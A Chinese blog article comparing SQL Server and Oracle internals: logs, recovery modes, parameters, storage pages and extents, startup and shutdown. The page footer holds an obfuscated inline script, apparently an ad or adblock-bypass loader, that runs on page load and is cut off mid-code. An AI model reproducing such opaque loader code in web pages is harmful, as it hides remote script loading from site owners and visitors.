Buffer)。抛开命名的差异，实际日志文件的作用却是一样的：在服务器意外宕机之后，数据库服务器会在服务重新启动之后检查文件的内容，如果在日志文件中发现已提交的事务而在数据文件中不存在时，这些已提交的事务就会被重新应用到数据文件中；如果日志文件中的记录显示事务没有完成或者是回滚了，那反映到数据文件中的变化也同样会回滚。在这个过程中的第一个部分称为重做(REDO)，第二个部分称为撤销(译注：这里英文为 undo，也许说回滚合适些)。<br><br> SQL Server为每个数据库单独的维护了一份事务日志，一份数据库事务日志可以存在有多个事务日志文件。事务日志文件在数据库创建的同时创建，之后也可以继续追加。对Oracle来说，数据库指的是素有的物理文件和逻辑的表空间。Oracle的重做日志会记录对于所有表空间的更改。一个Oracle数据库至少需要2个日志文件才能正常操作，当然日志文件可以多余2个，但是决不能少于2个。<br><br> SQL Server事务日志和Oracle重做日志之间的一个重大的区别就在于事务日志没有逻辑分组一说，而重做日志则可以被分组在2个或更多个日志分组当中。每个Oracle数据库至少需要有2个日志分组，每个分组里面必须要有一个或多个日志文件，日志组中的日志文件被称为日志组成员 (member)。<br><br> Oracle每次都是将日志缓存中的重做日志一次写入到一个重做日志组中的所有文件中。在一个日志组中使用多个日志文件的容错技术称为多路技术(multiplexing)。在一个日志组写满之后，Oracle就会转到下一个日志组，这样的操作称为日志切换(log switching)，在这个日志组满了之后又再转到下一个日志组，以此类推。当所有的日志都写满之后（不管是存在2个还是多个日志组），Oracle就会将第一个组中的日志清理掉，然后开启一轮新的写入循环。<br><br> SQL Server数据库的事务日志一样是顺序写入的，只是如果数据库不是运行在简单恢复模式或者是事务日志做了备份的话，日志是不会被自动清除掉的。如果一个数据库的逻辑事务日志空间满了之后，它对应的数据文件还无法增长的话，数据将无法继续处理用户操作。不过如果事务日志做过备份的话，那么SQL Server就会让新事务重用那些已备份日志所占用的空间，从这点上来说，SQL Server的逻辑事务日志是以一种“回环 (wrap-around)”的方式使用的。另外要强调的一点是SQL Server的事务日志文件的大小可以配置成自动扩展，而Oracle的重做日志文件则是有一个预定义大小的，如果不是手工更改这个大小的话，日志文件是不会自动增长的。<br><br> 就数据可用性而言，两种平台都提供了基于时间点恢复(point-in-time recovery)的选项，当然必要的话也可以禁止掉（这个在测试或开发系统中是可行的）。要是SQL Server数据库的基于时间点恢复的功能的话就必须是在完全恢复模式(full recovery mode)下。不管出于何种恢复模式，每次数据的修改都会被数据库记录在它对应的事务日志里面，这些日志会一直保留到事务日志备份备份的时候。数据库的恢复模式还能调整成简单恢复模式(simple recovery mode)，这种情况下的产生的事务日志会在每次检查点(checkpoint)发生时截断。检查点操作会将所有数据缓冲中已修改的数据写入到数据文件中，日志缓存中的日志信息写入到日志文件中。如果数据库运行在简单恢复模式下，检查点完成之后所有的检查点之前完成的事务所产生的事务日志都会被删除掉，因此SQL Server已经确定这些旧的已提交的事务已经确定被写入到数据文件中去了。<br><br> 现在假设数据库检测到一个错误（物理的或逻辑的），这时都可以使用最后一个全备先还原数据库然后使用备份的事务日志恢复到还原的数据库上面，这种特性可以让数据库回到之前的任意一个时间点（译注：当然是指完全备份之后的任意一个时间点），只是这个特性只有在数据库使用完全恢复模式的时候才可用。<br><br> Oracle中也有类似的概念。Oracle可以运行在归档模式(ARCHIVELOG)或是非归档模式(NOARCHIVELOG)下。在非归档模式下，当日志组链上的最后一个组写满之后就会覆盖第一个日志组，这时因为 Oracle的重做日志组是按照循环使用的方式运作的。当然这也就意味着数据库是不能回到那些被删除了的事务记录所对应的时间点的。所以从功能上说，这就相当于SQL Server的简单恢复模式。<br><br> 当Oracle数据库运行在归档模式下时，它同时也会在后台启动一个或者多个归档进程(archiver)，归档进程的作用就是在一个日志组满了之后将日志组的内容备份到放在磁盘上的文件中，这些保存的日志文件被称为归档日志(archived log)，日志组在归档之后就可以放心的被覆盖了。自己想想就会发现Oracle重做日志组归档的功能其实和SQL Server事务日志备份是一样的，也是说Oracle的归档模式和SQL Server的完全恢复模式是一样的。<br><br> Oracle和SQL Server一样，在还原全备之后可以使用归档日志进行还原。不同的时候SQL Server的事务日志备份需要手工的配置而Oracle只要配置了归档模式之后归档进行就会自动的进行日志归档备份操作。<br><br> 最后，从恢复时间(recovery time)上面也能看到两个平台的相似之处。在之前也提到过，在数据引擎启动时会经过一个重做和撤销的阶段，这个阶段所花费的时候称为恢复间隔 (recovery interval)。很明显的数据库管理员是希望这个时间越短越好的，在SQL Server中DBA可以通过下面的命令来配置这个时间间隔：<br> 1 sp_configure 'show advanced option', 1<br> 2 reconfigure<br> 3  <br> 4 sp_configure 'recovery interval', &lt;time-in-minutes&gt;<br> 5 reconfigure<br><br> 这个命令修改的是系统配置参数。设置好恢复间隔之后，SQL Server会自动调整检查点进程执行检查点的时间来满足这个设置的时间要求。设置这个恢复间隔的单位是分钟。<br><br> Oracle中类似的设置就是平均恢复时间(Mean Time To Recovery, MTTR)，可以通过修改初始化参数FAST_START_MTTR_TARGET来修改它，设置这个参数可以用来调整检查点执行的频率。这个值决定了Oracle再执行数据库崩溃恢复时所花费的时间，设置命令如下：<br> 1 ALTER SYSTEM SET FAST_START_MTTR_TARGET=&lt;number_of_seconds&gt; SCOPE=spfile;<br><br> 在Oracle没有明确与mdsb数据对应的东西。SYSAUX表空间也是一个系统表空间，在安装过程中（译注：准确说应该为“数据库创建过程中”）创建，它里面保存了诸如Oracle AWR(Automatic Workload Repository)信息、多维数据和多媒体数据，XML数据库等等。</p> 
<p> </p> 
<p>启动与配置参数<br><br> 在SQL Server安装的时候，同时也会往Windows注册表里面添加一些记录，这些注册表键值指定了实例所需要的各种参数。比如，有的注册表键值指定了错误日志的保存目录，另外的指定了默认的备份目录等等。SQL Server在运行的过程中会使用到这些注册表键值。另外还能给SQLSERVER.EXE指定一些启动参数，包括追踪标志(trace flags)，这些附加的参数决定了实例启动之后的行为。除了注册表键值和启动参数之外，SQL Server还包括大量的内部配置参数，用于对实例进行调优。比如说“max server memory”就属于这些参数之一，它可用来调整实例所能使用的最大内存。不用说了，这些系统配置参数也是保存在系统元数据表(system metadata tables)中的。<br><br> 下面例举的方法都可以用来修改SQL Server配置参数：<br><br>     * 使用系统存储过程sp_configure<br>     * 使用Management Studio或是Enterprise Manager的服务器属性对话框<br>     * 使用各种层面(facets)组件(2008)或外围应用配置器(Surface Area Configuration)工具(2005)<br><br> Oracle的配置参数来自两个对于启动实例和打开数据库都是非常重要的操作系统文件，第一个文件是初始化参数文件 (initialisation parameter file)，第二个是控制文件(control file)。初始化参数文件所包含的参数决定怎么样创建实例。记住Oracle实例只包含内存结构和后台进程。参数文件包含的值决定了Oracle要给自己分配多少内存，可以同时有多少用户可以连接到数据库等等。Oracle在读取到这个文件之后才会在内存中建立数据库实例。<br><br> 参数文件可以是一个纯文本的ASCII文件或者是二进制文件，纯文本参数文件称为pfile，名字为init.ora，其中的SID就是实例的SID了（参照“实例名与SID”小节）。二进制参数文件称为spfile，名字为spfile.ora。纯文本参数文件和二进制参数文件之间最大的差别就是当使用pfile的时候，Oracle只在实例启动的时候读取一次，后续对pfile的修改都要等到实例重启之后才能生效。而使用spfile时，Oracle能在实例运行期间修改其内容。在本文写作之时，Oracle 11g已经有超过250个的初始化参数了，不过还好，作为DBA你是不需要挨个的去设置这些参数的，你只需要配置那么十来个参数就可以保证实例正常使用了，大多数参数值都会使用Oracle默认的设定值。你可以通过Oracle Enterprise Manager Database Control（稍后细说）或者是手工的修改这些初始化参数，手工方法即时通过ALTER SYSTEM命令来修改spfile，使用pfile时，DBA可以直接使用文本编辑器进行修改。（译注：不管是使用pfile还是spfile，都能够使用ALTER SYSTEM命令修改这些参数，只是使用pfile时这些参数的修改是无法保存下来的，同时能修改的也只是一些动态的参数，而使用spfile则可以将这些修改保存到spfile文件中永久保留下来。）<br><br> 控制文件是实例启动之后Oracle第二个要读取的文件。控制文件所存放的位置也是由参数文件中的参数来指定的。控制文件是一个很小的二进制文件，它包含了与数据库相关的关键的信息，其中包括数据文件和重做日志文件的名字与位置、表空间信息以及检查点信息，Oracle使用控制文件来找到数据文件，然后才能打开供用户访问。控制文件损坏或者是不存在的话数据库都是无法打开的。考虑到控制文件的重要性，通常的做法都是设置多份相同的控制文件拷贝以保证容错能力，多路控制文件中的所有控制文件都会同时的被更新。<br><br> 最后，第三种Oracle数据库要使用的文件就是密码文件(password file)了，这个文件保存了拥有启动和关闭数据库权限的用户帐户的用户名和密码，稍后会细说。<br><br><br> 更改系统元数据和参数配置<br><br> 不管是Oracle还是SQL Server，系统元数据表、文件、注册表键值或是配置参数都会在用户或者是应用访问数据库并作出变更的时候由数据库引擎自动做出相应的修改。比如说，当在数据库中新建表时，数据库引擎会在系统表中增加相应的行；当DBA修改参数值时，更新也会被捕捉并更新到表中或是文件中。<br><br> 在SQL Server中，更改系统元数据的操作包括：<br><br>     * DDL操作：创建、修改、删除数据库或者数据库对象。<br>     * 修改系统配置参数（不管是用sp_configure或是GUI）。<br>     * DCL（数据控制语言，Data Control Lanuage）操作：登陆、认证、证书、代理或者是新建、更新、删除数据库用户。<br>     * SQL Server配置管理器：当SQL Server或是代理服务数据变更。<br>     * 系统级变更：创建、修改或者删除连接服务器(link server)、端点(end-point)、Service Broker组件。<br><br> 在Oracle中，更改数据字典、控制文件或是参数文件的操作包括：<br><br>     * DDL操作：创建、更改、删除表空间、数据文件或者是数据库对象。<br>     * DCL操作：创建、更改、删除用户账户；给用户授予角色、权限。<br>     * 使用ALTER SYSTEM命令或者是用Enterprise Manager Database Control修改初始化参数。<br>     * 用Enterprise Manager Database Control或者是ALTER DATABASE命令修改数据库的状态。<br>     * 备份配置或执行备份操作。<br><br> 最后，SQL Server中可以使用sp_configure存储过程或是服务器属性对话框（仅部分参数）查看配置参数。<br> 1 sp_configure 'max server memory'<br><br> 在Oracle中，可以通过执行SHOW PARAMETER命令或是使用Enterprise Manager Database Control查看初始化参数。<br> 1 show parameter sga_target;<br><br> 动态视图<br><br> 除了数据字典视图之外，Oracle还提供大量称为动态性能视图(Dynamic Performance Views)的视图，这些视图可以用来查看实例的内存结构或者是控制文件的内容。与数据字典视图不同的是，动态性能视图的内容不是来自于静态的数据表，而是来自服务器内存中实时的数据。这些数据在实例启动的时候开始积累，贯穿于整个实例的生命周期之内，在实例重启或是关闭的时候消失。另外一个不同点就是DBA只能在数据库打开并在线的时候才能查看数据字典视图，而动态性能在实例启动运行之后就能够查看了。部分的动态性能视图只能在数据库MOUNT之后才能查看。这些视图常被称为V$视图，因为它们的名字都是以V$开头的。例如，下面的查询可以显示Oracle实例使用的初始化参数：<br> 1 SELECT NAME, DESCRIPTION, VALUE FROM v$system_parameter;<br><br> 下面的查询显示当前会话相关的信息：<br> 1 SELECT USERNAME, COMMAND, SCHEMANAME, OSUSER, MACHINE FROM V$SESSION;<br><br> 在SQL Server 2005中，动态管理视图(Dynamic Management Views, DMV)也同样可以显示实例内存中大量信息。和Oracle动态性能视图一样，DMV也不存在对应的数据表，也在系统重启之后会重新记录。DMV属于SYS架构 (schema)，名字以”dm_”开头，下面的代码显示SQL Server实例当前的会话情况：<br> 1 SELECT * FROM  sys.dm_exec_requests<br><br> 存储的物理和逻辑结构<br><br> 不管是SQL Server的数据库还是Oracle的表空间，它们的物理形态都是存在于主机操作系统下的一系列文件。存在于数据库中的表、视图、索引之类的对象也只有数据库引擎才能识别，这些逻辑对象在物理文件中都是按照一定格式排列，且能被数据库存储引擎所读取。不必说的是，这些逻辑对象和物理文件的内容也是数据库引擎所维护的。<br><br> 就所涉及到页或者区这方面，SQL Server一直以来都变化不大。数据库页(database page)是SQL Server存储分配和I/O操作的最小单位，一个页大小为8KB。在一个页中，页头占96字节，页头包含了诸如页类型、剩余空间之类的信息。页头之后就是存储的数据行了，跟着的是一些空闲的空间。在页最后是行偏移部分，页中每个数据行都会在行偏移部分有条记录，它记录的是每行开头相对于页的起始点的偏移量。<br><br> SQL Server中不同类型的页有着不同的功能。一般来说数据行包含在数据页中，索引记录存储在索引页中，诸如xml、image、text、 varchar(max)或nvarchar(max)之类的特殊类型存储在image或是text之类的特殊页中。当中还有一些像GAM、IAM、 PFS之类的特殊页，下面会一一细说。<br><br> 页是I/O操作和存储的最后单位，而空间则是以区的形式分配。一个数据库区的大小是固定的：它包含8个物理上连续的页，也就是64KB的结构，每1M的数据库空间都是由16个区数构成的。<br><br> 区可以进一步分成两类：统一区(uniform)或 混合区(mixed)。在一个统一区中，全部8个页都是来自同一个类似表或是索引之类的对象；在一个混合区中，页可以从属于不同的对象。在创建表或是索引时，通常都是从混合区中分配页。在表或索引的数据增长到足够填满8个或更多页的时候，就会自动的切换到统一区中去。<br><br> SQL Server将区分配给各种对象，并通过一些特别的数据库页来跟踪区的使用情况，这些特别的页和普通的存储数据行的数据页不一样，它们更像是一个位图映射 (bitmap)表，每个位(bit)都对应着一个区。<br><br> 全局分配映射页(Global Allocation Map, GAM)用于跟踪区的使用情况，每个GAM页可以跟踪64000个区或者说4GB的数据。在GAM页中，如果某个位值为0，则表示它所对应的区已经分配给了某个对象使用，值为1时表示这个区是空闲的。这个其实就和Oracle的表空间的本地管理模式（稍后开讲）是一样的。<br><br> 共享全局分配映射页(Shared Global Allocation Map, SGAM)功能和GAM是一样的，所不同的就是SGAM是用来管理混合区的。不过它的位图映射关系正好是相反的：在GAM中设置为1的，在SGAM中设置为0——用于代表一个空闲的区。<br><br> 位图映射的概念同样也用在页可用空间(Page Free Space, PFS)，这种页记录了某个页是否分配给了某个对象，并且记录这个页上有多少可用的空间，位图映射值可显示一个页的使用率是50%、85%、95%或是95%以上。SQL Server根据这个信息来决定是否要给一行数据分配新的空间。<br><br> 最后要说的是索引分配映射页(Index Allocation Map, IAM)，SQL Server使用这种页来跟踪分配给索引的区的使用情况。在一个表使用了聚集索引的时候，表中的数据行以及对应的数据页都是按照索引键的顺序来存储的，而索引本书是存储在索引页中，聚集索引的数据页由双向链表相互链接，整个索引也是B-树（平衡树）结构的。<br><br> 当表上没有建立聚集索引时，则称之为堆(heap)，堆中的数据行不会有特别的存储顺序，堆表中的数据页同样也没有特别顺序，相互之间也不存在链接。SQL Server是通过扫描IAM页来查找数据页，基本上SQL Server是先从堆的第一个IAM开始扫描，找到页上定义的所有区，然后再转向堆中下一个IAM页，就这样一直重复下去，直到数据文件中（译注：跟堆表相关的所有数据文件）的所有IAM页都扫描完毕才停止。<br><br> SQL Server数据文件中预定义了一序列的特殊页，如下图所示：<br><br> 在数据文件的最开始是数据文件头也，接着是PFS页，再接着是GAM页、SGAM页和IAM页。SQL Server通过这种结构知道自己该怎么去查找一个数据文件。<br><br> 在Oracle中，数据库中最高级别的逻辑结构就是表空间了，表空间由称为段(segment)的逻辑结构组成，段是给逻辑对象分配存储空间时的单位。在表空间中可以存在各种类型的段，包括表、索引、UNDO等等。表空间和段之间的关系是一对多的：一个表空间可以包含多个段，一个段只能对应于一个表空间。<br><br> 段的空间是以区(extents)分配的，Oracle中区的概念和SQL Server十分类似。当在表空间中创建一个段时，会先至少分配一个区，当需要更多空间的时候，再在段中分配更多的区。段和区的关系也是一对多的：一个区之能从属于一个段。<br><br> Oracle中区同时还扮演着关联逻辑对象和物理结构的角色，它是Oracle数据文件的最小分配单位。同样的数据文件和区之间的关系也是一对多的：一个数据文件可以包含很多个区，但是一个特定的区只能从属于一个特定的文件，区是不能够跨文件的。<br><br> 目前为止我们了解的Oracle结构可以总结如下：一个数据库会包含多个表空间，一个表空间可能包含一个或多个数据文件用于对象存储，每个表空间同时也会包含多个段，同样这些段中又会包含一个或多个的区。数据文件由区构成：每个区从属于某个特定的段，并且存在于某个特定数据文件中。逻辑段和物理文件之间的关系是多对多的关系：一个段可以包含多个区，每个区则从属于某个特定的数据文件。<br><br> 在往下，在区中的数据存储在一个个连续的数据块(data blocks)中。数据块是Oracle中最小的 I/O和数据存储单位，这点和Microsoft SQL Server的页是一样的。如果你觉得区和数据块之间的关系是一对多的话，那你就对了。<br><br> SQL Server数据页和Oracle数据块之间一个很有意思的差别就在于它们的大小，在SQL Server中，各个版本中页的大小都是一样的：8KB，而且不能修改。而在Oracle中，在创建数据库的表空间的是时候会提供一个默认的块大小，不过也可以不用它。你可以在数据库中新建一个不同于其他表空间块大小的表空间，只不过一旦表空间创建之后，块大小就不能再变了。<br><br> 另一个存在于SQL Server和Oracle之间的存储差异就是区的管理方式。因为区是在段中分配的，它的管理方式可以通过数据字典或是在表空间本地来完成。<br><br> 过去的Oracle使用的都是基于字典的区分配管理(dictionary managed extent allocation)。与SQL Server系统表类似，Oracle的数据字典是一个系统元数据的集中仓库。当时字典管理区时，每个区的创建、分配、回收、删除都会被记录到数据字典中的系统表中，在表上产生相应的IO操作。<br><br> Oracle已经不再鼓励用户使用字典管理的方法了，代之于本地区分配管理(locally managed extent allocation)，这种管理方法是在表空间里面维护一个显示区可用与否的位图，这个和SQL Server的GAM页很相像。位图中的每一位代表一个数据块或者区（在表空间使用统一大小的自动区管理时），在区分配或收回的时候自动的更新位图信息。<br><br> 考虑到兼容性的因素，字典管理的方法依然存在，DBA可以在创建表空间的时候任意选择这两种方法中的一种。<br><br> 我这里不再深入的讨论索引的存储结构了，不过在这里再说下Oracle和SQL Server的最后一个差别。因为Oracle可以在多种不平台使用，它的数据库可以使用到各类操作系统的文件系统：比如在Windows 上，Oracle可以安装在NTFS的卷上。Oracle还提供了独立于操作系统而自己来管理物理存储的机制，实现这种机制依赖的是高级存储管理(Advanced Storage Management, ASM)，Microsoft SQL Server就没有这种东西了：它的存储引擎利用的是Windows文件系统，而且这个产品只能在Windows平台上使用。<br><br> 启动和关闭<br><br> Microsoft SQL Server和Oracle的启动和关闭顺序是不一样的。在SQL Server中，注册表键值、跟踪标志以及系统配置值对系统启动有着很大的影响。在启动过程中，要加载一系列的DDL、建立内存结构、打开监听端口等等一序列的操作。不看错误日志的，这个过程是没有什么特别的东西的。一般来说DBA可以通过[控制面板]-&gt;[服务管理]（SQL Server 2000及之前的版本）或者是配置管理器（SQL Server 2005及之后的版本）来启动SQL Server服务。你还可以在命令行中直接运行sqlserver.exe来进行特殊的启动，比如说使用-m参数启动到单用户模式，使用-f参数启动到最小配置模式。<br><br> 要启动Oracle时，DBA只需要在SQL*PLUS或是其他查询工具中执行一个简单的命令：STARUP。然后启动进程就会先读取Oracle参数文件，然后创建相应的内存结构，启动后台进程。这个阶段之时启动了数据库实例但是并没有打开数据库。下一个阶段是mount数据库，当数据库mount之后，Oracle打开数据库控制文件，读取里面的内容，定位到数据库文件。在第三个阶段，也是最后一个，打开数据库。如果上一次数据库没有按照正常流程关闭的话，此时的数据文件是不同步的（译注：说不一致更准确），这样在打开数据库的阶段就要对未完成的事务进行回滚，对完成了的事务进行前滚。在这阶段的最后，用户就可以使用数据库了。<br><br> 为方便诊断问题，你可以一步步的执行这些步骤，下面的命令就只创建一个实例：<br> 1 STARTUP NOMOUNT;<br><br> 如果成功了，就可以让Oracle使用下一个命令加载控制文件了：<br> 1 ALTER DATABASE MOUNT;<br><br> 一旦数据库mount之后，使用下面最后一个命令打开数据：<br> 1 ALTER DATABASE OPEN;<br><br> 可以想象，如果Oracle会在启动过程中出问题的话，只要你一步步的执行上面的命令，就能很容易的定位到问题源。这个和在命令行中加上追踪标志及其它参数启动SQL Server差不多。<br><br> 要正常关闭SQL Server时，你可以在Windows控制面板的服务管理器重停掉SQL Server服务，不过推荐使用配置管理器来操作。停掉服务时，SQL Server会在停掉所有连接关闭之前会确保所有包括数据和日志的更改都已经写入到操作系统文件中。你也可以在查询分析器或是Management Studio中执行SHUTDOWN命令来关闭数据库，使用SHUTDOWN命令的时候可以加上WITH NOWAIT语句，当使用了WITH NOWAIT时，SQL Server会立即停止，不再进行必要的检查点操作，这样关闭后SQL Server需要再下次启动时回滚未完成的事务。<br><br> 如果你猜Oracle也是可以用一个SHUTDOWN命令来关闭数据库的话，恭喜你，又猜对了。不过Oracle的SHUTDOWN还有四个不同的选项。<br><br> 如果你执行的是SHUTDOWN ABORT，那这个和SQL Server的SHUTDOWN WITH NOWAIT是一样的。这就相当于拔掉服务器的电源或者是关掉开关，Oracle来不及执行检查点操作，文件也就没有更新，日志也没有写入到磁盘中。<br><br> 执行SHUTDOWN IMMEDAITE会让Oracle关闭所有没有活动事务的连接，并拒绝新的连接进来。有活动事务的连接则会在完成事务回滚之后被关闭，然后数据库关闭。<br><br> 如果你希望数据库在现有的活动事务完成之后再关闭的话，则可以执行SHUTDOWN TRANSACTIONAL命令，这个命令和SHUTDOWN IMMEDAITE类似，不同的是会等待正在进行的事务完成而非强行终止。<br><br> 一般DBA都不会去用的一个命令就是SHUTDOWN NORMAL（译注：这个命令和直接用SHUTDOWN 等价）了，这个命令会导致数据库拒绝新的会话，但是Oracle会等到所有的用户都断开自己的连接之后才会关闭数据库。这是和其他方法不一样的地方，Oracle不会强制结束现有的会话。<br><br> 除SHUTDOWN ABORT之外，其他三种方法都能够让Oracle数据库在保证数据一致性的情况下关闭。Oracle干净的关闭之后，所有未完成的事务都会回滚，检查点进程会更新数据文件，日志记录也会写入到磁盘当中去，最后在更新完文件头（译注：更新相应的检查点信息）之后再关闭所有文件（译注：即关闭数据库）。</p> 
<p><img alt="" class="has" src="https://images2.imgbox.com/80/70/Exv3SRi0_o.png"></p> 
<p> </p>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/32f20ed331ba05704e65e5164e3e72a7/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">Unity操控Arduino板接舵机旋转</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/bf798a8f17176e15b1cebebfc6eea6dc/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">超分辨之----DRCN论文理解</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程爱好者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151260"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa